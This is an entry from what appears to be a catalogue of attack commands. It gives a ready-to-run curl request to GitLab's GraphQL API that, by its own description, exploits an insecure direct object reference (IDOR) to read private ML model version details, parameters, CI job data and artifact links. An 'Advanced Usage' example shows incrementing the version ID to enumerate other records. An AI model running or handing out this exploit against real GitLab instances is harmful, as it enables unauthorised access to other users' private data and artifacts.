---
id: cmd-gitlab-get-version
data: >-
  curl -X POST 'https://gitlab.com/api/graphql' -H 'Cookie:
  _gitlab_session=<your-session-cookie>' -H 'X-Csrf-Token: <your-csrf-token>' -H
  'Content-Type: application/json' -d
  '{"operationName":"getModelVersion","variables":{"modelId":"gid://gitlab/Ml::Model/1000401","modelVersionId":"gid://gitlab/Ml::ModelVersion/1000535"},"query":"query
  getModelVersion($modelId: MlModelID!, $modelVersionId: MlModelVersionID!) {
  mlModel(id: $modelId) { id name version(modelVersionId: $modelVersionId) { id
  version packageId description candidate { id name iid eid status params {
  nodes { id name value __typename } __typename } metadata { nodes { id name
  value __typename } __typename } metrics { nodes { id name value step
  __typename } __typename } ciJob { id webPath name pipeline { id mergeRequest {
  id iid title webUrl __typename } user { id avatarUrl webUrl username name
  __typename } __typename } __typename } _links { showPath artifactPath
  __typename } __typename } _links { showPath __typename } __typename }
  __typename } }"}'
tags:
  - graphql
  - idor
  - query
  - version
type: command
output: null
executor: curl
platforms:
  - Web
  - GitLab
created_at: '2024-10-01T00:00:00Z'
updated_at: '2025-12-14T17:25:47.603Z'
verified: false
validated: true
submitted: true
---
# gitlab-graphql-get-model-version

## Command

```bash
curl -X POST 'https://gitlab.com/api/graphql' \
  -H 'Cookie: _gitlab_session=<your-session-cookie>' \
  -H 'X-Csrf-Token: <your-csrf-token>' \
  -H 'Content-Type: application/json' \
  -d '{"operationName":"getModelVersion","variables":{"modelId":"gid://gitlab/Ml::Model/1000401","modelVersionId":"gid://gitlab/Ml::ModelVersion/1000535"},"query":"query getModelVersion($modelId: MlModelID!, $modelVersionId: MlModelVersionID!) { mlModel(id: $modelId) { id name version(modelVersionId: $modelVersionId) { id version packageId description candidate { id name iid eid status params { nodes { id name value __typename } __typename } metadata { nodes { id name value __typename } __typename } metrics { nodes { id name value step __typename } __typename } ciJob { id webPath name pipeline { id mergeRequest { id iid title webUrl __typename } user { id avatarUrl webUrl username name __typename } __typename } __typename } _links { showPath artifactPath __typename } __typename } _links { showPath __typename } __typename } __typename } }"}'
```

## Description

Executes a GraphQL query to fetch details of a specific ML model version, exploiting IDOR to access unauthorized private version data including parameters and artifacts.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `modelId` (in JSON) | Global ID of the parent model | Yes |
| `modelVersionId` (in JSON) | Global ID of the version (e.g., gid://gitlab/Ml::ModelVersion/1000535) | Yes |
| `Cookie` header | Authentication session | Yes |
| `X-Csrf-Token` header | CSRF protection | Yes |

## Examples

### Basic Usage

```bash
# As shown in command
```

### Advanced Usage

Change version ID:
```bash
-d '{"operationName":"getModelVersion","variables":{"modelId":"gid://gitlab/Ml::Model/1000401","modelVersionId":"gid://gitlab/Ml::ModelVersion/1000534"},"query":"..."}'
```

## Expected Output

JSON with data.mlModel.version containing id, version, packageId, description, candidate (params, metadata, metrics), ciJob, and _links (including artifactPath for downloads).

## Related

- [[commands/gitlab-graphql-get-model]]
- [[procedures/Query-ML-Model-Version-Details-via-GraphQL-IDOR]]
